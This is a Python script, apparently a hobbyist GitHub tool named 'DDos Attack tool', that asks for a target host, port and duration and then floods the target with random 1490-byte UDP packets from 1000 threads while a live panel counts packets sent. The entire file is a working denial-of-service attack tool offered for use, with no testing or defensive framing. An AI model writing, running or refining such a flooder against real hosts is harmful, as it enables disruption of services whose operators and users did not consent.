#!/usr/bin/python3

import os
import time
import sys
import socket
import threading
import platform
import random

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    from rich.prompt import Prompt
    from rich.live import Live
    from rich.table import Table
except ImportError:
    os.system("pip3 install rich")
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    from rich.prompt import Prompt
    from rich.live import Live
    from rich.table import Table

console = Console()
system = platform.uname()[0]
packet_count = 0
start_time = None
stop_event = threading.Event()

def title():
    if system == 'Linux':
        os.system("printf '\033]2;DDos-Attack\a'")
    elif system == 'Windows':
        os.system("title DDos-Attack")
    else:
        console.print("[bold red]Unsupported OS[/bold red]")
        sys.exit()

def cls():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
        console.print("[bold red]Unsupported OS[/bold red]")
        sys.exit()

def hud():
    global packet_count, start_time
    with Live(refresh_per_second=1) as live:
        while not stop_event.is_set():
            elapsed = int(time.time() - start_time)
            table = Table(title="Attack HUD", style="bold green")
            table.add_column("Elapsed Time", justify="center")
            table.add_column("Packets Sent", justify="center")
            table.add_row(f"{elapsed} sec", f"{packet_count}")
            live.update(table)
            time.sleep(1)

def menu():
    global packet_count, start_time
    title()
    cls()

    banner = Text("""
            ██████  ██████   ██████  ███████        █████  ████████ ████████  █████   ██████ ██   ██ 
            ██   ██ ██   ██ ██    ██ ██            ██   ██    ██       ██    ██   ██ ██      ██  ██  
            ██   ██ ██   ██ ██    ██ ███████ █████ ███████    ██       ██    ███████ ██      █████   
            ██   ██ ██   ██ ██    ██      ██       ██   ██    ██       ██    ██   ██ ██      ██  ██  
            ██████  ██████   ██████  ███████       ██   ██    ██       ██    ██   ██  ██████ ██   ██ 
 """, style="bold green")

    info = Text("                               ░░░░░░░░░░░░░░░░▒▓█Crate by SabriAmir█▓▒░░░░░░░░░░░░░░░░", style="bold blue")
    github = Text("                      ░░░░░░░░░░░░░░░░▒▓█github: https://github.com/SabriAmir█▓▒░░░░░░░░░░░░░░░░", style="bold cyan")

    console.print(Panel(banner, title="DDos Attack tool", subtitle="v1.0.0", border_style="yellow"))
    console.print(info)
    console.print(github)

    host = Prompt.ask("\n[bold yellow]Enter Host URL ~> [/bold yellow]")
    port = int(Prompt.ask("[bold yellow]Enter Target Port ~> [/bold yellow]"))
    duration = int(Prompt.ask("[bold yellow]Enter Attack Duration (seconds) ~>[/bold yellow]"))

    UDP_PORT = port
    bs = random._urandom(1490)
    cls()
    ip = socket.gethostbyname(host)

    console.print(Panel(f"Target IP: [bold red]{ip}[/bold red]\nTarget Port: [bold red]{UDP_PORT}[/bold red]\nDuration: [bold red]{duration} sec[/bold red]",
                        title="Target Info", border_style="red"))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()

    def run(k):
        global packet_count
        while not stop_event.is_set():
            sock.sendto(bs, (ip, port))
            packet_count += 1

    # Start HUD thread
    hud_thread = threading.Thread(target=hud, daemon=True)
    hud_thread.start()

    # Start attack threads
    for i in range(1000):
        ch = threading.Thread(target=run, args=[i])
        ch.start()

    # Wait for duration
    time.sleep(duration)
    stop_event.set()
    console.print(f"\n[bold green]Attack finished. Total packets sent: {packet_count}[/bold green]")

if __name__ == '__main__':
    try:
        try:
            menu()
        except EOFError:
            console.print("\n[bold red]Ctrl + D detected. Exiting...[/bold red]")
            sys.exit()
    except KeyboardInterrupt:
        console.print("\n[bold red]Ctrl + C detected. Exiting...[/bold red]")
        sys.exit()